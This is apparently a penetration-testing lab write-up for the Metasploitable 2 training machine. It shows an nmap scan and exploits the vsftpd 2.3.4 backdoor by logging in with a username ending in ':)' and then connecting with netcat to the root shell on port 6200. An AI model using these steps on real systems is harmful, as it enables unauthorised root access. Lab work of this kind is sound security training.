# Metasploitable 2


## Reconnaissance

> nmap -sC -sV 192.168.x.x

open ports discovered:

21/tcp    ftp           vsftpd 2.3.4
22/tcp    ssh           OpenSSH 4.7p1 Debian 8ubuntu1
23/tcp    telnet        Linux telnetd
25/tcp    smtp          Postfix smtpd
53/tcp    domain        ISC BIND 9.4.2
80/tcp    http          Apache httpd 2.2.8 (Ubuntu DAV/2)
111/tcp   rpcbind       RPC #100000
139/tcp   netbios-ssn   Samba smbd 3.X - 4.X
445/tcp   netbios-ssn   Samba smbd 3.X - 4.X
512/tcp   exec          netkit-rsh rexecd
513/tcp   login         rlogind
514/tcp   shell         rsh
1099/tcp  java-rmi      GNU Classpath grmiregistry
1524/tcp  bindshell     Metasploitable root shell
2049/tcp  nfs           NFS 2-4
2121/tcp  ftp           ProFTPD 1.3.1
3306/tcp  mysql         MySQL 5.0.51a-3ubuntu5
5432/tcp  postgresql    PostgreSQL 8.3.x
5900/tcp  vnc           VNC protocol 3.3
6000/tcp  X11           access denied
6667/tcp  irc           UnrealIRCd
8009/tcp  ajp13         Apache JServ Protocol v1.3
8180/tcp  http          Apache Tomcat/Coyote JSP engine 1.1

Many services are exposed and several are known to be vulnerable due to outdated software.

## Enumeration

1- FTP service running on port 21:
Service detected: vsftpd 2.3.4
  This version contains a backdoor vulnerability that can be triggered by sending a username ending with ':)'.
  When triggered, the server opens a shell on port 6200.

## Exploitation:
-Connected to FTP service:
  ftp 192.168.x.x

-Login attempt using a random username ending with ':)' and a random password.

-After sending the random credentials, the backdoor is triggered, then connect to the backdoor shell using netcar trough the port '6200'
  nc 192.168.x.x 6200

shell access obtained.

## Privilege Escalation

The backdoor provides direct root access, no additional privilege escalation needed.
